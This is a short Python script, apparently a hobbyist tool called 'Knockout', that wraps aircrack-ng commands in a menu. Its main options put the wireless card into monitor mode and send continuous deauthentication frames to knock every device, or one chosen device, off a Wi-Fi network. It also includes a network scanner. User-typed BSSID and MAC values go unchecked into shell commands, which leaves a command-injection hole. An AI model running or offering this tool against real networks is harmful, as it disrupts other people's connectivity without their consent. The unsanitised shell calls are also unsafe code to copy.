import os
import sys
from rich import print


print("")
print('''[blue]
██╗░░██╗███╗░░██╗░█████╗░░█████╗░██╗░░██╗░█████╗░██╗░░░██╗████████╗
██║░██╔╝████╗░██║██╔══██╗██╔══██╗██║░██╔╝██╔══██╗██║░░░██║╚══██╔══╝
█████═╝░██╔██╗██║██║░░██║██║░░╚═╝█████═╝░██║░░██║██║░░░██║░░░██║░░░
██╔═██╗░██║╚████║██║░░██║██║░░██╗██╔═██╗░██║░░██║██║░░░██║░░░██║░░░
██║░╚██╗██║░╚███║╚█████╔╝╚█████╔╝██║░╚██╗╚█████╔╝╚██████╔╝░░░██║░░░
╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░░╚════╝░╚═╝░░╚═╝░╚════╝░░╚═════╝░░░░╚═╝░░░
                                             by elyum
[/blue]''')
print("")

print("[bold blink red]Important![/bold blink red]")
q = input("You need to install additional packages. Enter 'install' to install this.\nIf you've done this earlier, enter 'c'.\n")

def install():
   print("[bold green]Installing additional packages...[/bold green]")
   os.system('sudo apt install aircrack-ng')
   print("Well done!")

def c():
   print("[bold red]Reccomended![/bold red]")
   print("Before each action do recovery network (3)")
   option = input("Choose the option: \n1) - Disconnect all devices from the network\n2) - Disconnect an individual device from the network\n3) - Network recovery\n4) - Network scanner\n5) - Exit\n")

   if option == "1":
      bssid = input("Enter the network BSSID: ")
      os.system('sudo airmon-ng check kill')
      os.system('sudo airmon-ng start wlan0')
      os.system('sudo aireplay-ng --deauth 0 -a '+bssid+' wlan0mon')
   elif option == "2":
      bssid = input("Enter the network BSSID: ")
      target_mac = input("Enter the target MAC adress: ")
      os.system('sudo airmon-ng check kill')
      os.system('sudo airmon-ng start wlan0')
      os.system('sudo aireplay-ng --deauth 0 -a '+bssid+' -c '+target_mac+' wlan0mon')
   elif option == "3":
      os.system('sudo airmon-ng stop wlan0mon')
      os.system('sudo service NetworkManager restart')
      os.system('clear')
      c()
   elif option == "4":
      os.system('sudo airmon-ng start wlan0')
      os.system('sudo airodump-ng wlan0mon')
   elif option == "5":
      sys.exit()
   else:
      print("[bold red]Error[/bold red]")

if q == "install":
   install()
   os.system('clear')
   c()
elif q == "c":
   c()
else:
   print("[bold red]Error[/bold red]")